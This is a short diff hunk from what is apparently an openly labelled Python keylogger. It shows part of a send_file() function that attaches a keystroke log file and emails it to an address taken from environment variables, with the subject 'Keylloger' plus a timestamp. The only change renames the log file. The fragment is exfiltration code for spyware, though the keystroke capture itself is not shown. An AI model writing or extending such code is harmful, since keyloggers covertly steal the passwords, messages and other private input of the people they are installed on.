@@ -43,7 +43,7 @@ def send_file():
     message['From'] = os.getenv('EMAIL')
     message['To'] = os.getenv('EMAIL')
     message['Subject'] = f'Keylloger {date_time}'
-    file_name = 'Email KeyLLoger.txt'
+    file_name = 'keylloger_file.txt'
     attachment = open(file_name, 'rb')
     part = MIMEBase('application', 'octet-stream')
     part.set_payload(attachment.read())
